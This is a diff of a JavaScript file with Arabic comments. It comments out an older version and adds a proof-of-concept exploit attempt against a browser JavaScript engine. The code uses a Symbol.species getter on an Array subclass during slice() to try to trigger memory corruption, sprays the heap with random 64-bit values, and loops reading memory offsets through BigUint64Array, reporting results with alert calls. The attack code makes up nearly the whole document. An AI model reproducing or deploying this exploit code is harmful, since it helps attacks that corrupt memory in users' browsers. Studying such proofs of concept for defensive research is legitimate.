@@ -428,6 +428,8 @@ function main() {
 main();
 */
 
+
+/*
 let Trigger = false;
 // تعيين Arr بشكل مباشر من البداية
 let arrBuffer = new ArrayBuffer(0x4000);
@@ -489,6 +491,86 @@ function main() {
         let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
         Target(Snowflake, 0x20, qwordValue);
         for (let Idx = 0x20; Idx < 0x100; Idx++) {
+            readMemory(Idx);
+        }
+        alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
+        alert(`y[0] = ${y[0].toString(16)}`);
+        alert(`Arr.length = ${Arr.length}`);
+    } catch (e) {
+        alert(`Main Error: ${e.message}`);
+    }
+}
+
+main();
+*/
+
+let Trigger = false;
+// تعيين Arr بشكل مباشر
+let arrBuffer = new ArrayBuffer(0x8000); // زيادة الحجم
+let Arr = new BigUint64Array(arrBuffer);
+let ab = new ArrayBuffer(0x8000); // زيادة الحجم
+let y = new BigUint64Array(ab);
+
+function Target(Special, Idx, Value) {
+    try {
+        Arr.fill(0n); // تهيئة بـ BigInt صفر
+        Special.slice();
+        Arr[Idx] = Value; // كتابة القيمة 64-bit
+        y[0] = Arr[Idx]; // قراءة إلى y
+        if (Idx === 0x20 && Trigger) {
+            //alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
+        }
+        //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
+    } catch (e) {
+        alert(`Error at Idx ${Idx.toString(16)}: ${e.message}`);
+    }
+}
+
+class SoSpecial extends Array {
+    static get [Symbol.species]() {
+        return function() {
+            if (Trigger) {
+                Arr.fill(0n); // إعادة تهيئة
+                let sprayAb = new ArrayBuffer(0x200); // زيادة الحجم
+                let sprayView = new BigUint64Array(sprayAb);
+                for (let i = 0; i < sprayView.length; i++) {
+                    sprayView[i] = BigInt(Math.floor(Math.random() * Number.MAX_SAFE_INTEGER)) << 32n | BigInt(Math.floor(Math.random() * Number.MAX_SAFE_INTEGER)); // قيم عشوائية 64-bit
+                }
+                let spray = new Array(0x2000).fill(sprayAb); // تكرار
+                alert("Heap sprayed with random 64-bit values");
+            }
+        };
+    }
+};
+
+function readMemory(Idx) {
+    try {
+        y[0] = Arr[Idx] || 0n; // قراءة القيمة الحالية
+        alert(`Read at ${Idx.toString(16)}: ${y[0].toString(16)}`);
+        return y[0];
+    } catch (e) {
+        alert(`Read Error at ${Idx.toString(16)}: ${e.message}`);
+        return 0n;
+    }
+}
+
+function main() {
+    try {
+        const Snowflake = new SoSpecial();
+        // كتابة قيم مختلفة قبل Trigger
+        for (let Idx = 0x20; Idx < 0x40; Idx++) { // نطاق من 0x20 إلى 0x3f
+            let uniqueValue = BigInt(Idx) << 32n | 0xdeadbeefn; // قيمة فريدة لكل فهرس
+            Target(Snowflake, Idx, uniqueValue);
+        }
+        alert("Initial writes completed"); // تنبيه للتحقق
+        for (let Idx = 0; Idx < 0x400; Idx++) {
+            Target(Snowflake, 0, 0n);
+        }
+        alert("Loop completed"); // تنبيه للتحقق
+        Trigger = true;
+        let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
+        Target(Snowflake, 0x20, qwordValue);
+        for (let Idx = 0x20; Idx < 0x100; Idx++) { // نطاق أوسع
             readMemory(Idx);
         }
         alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
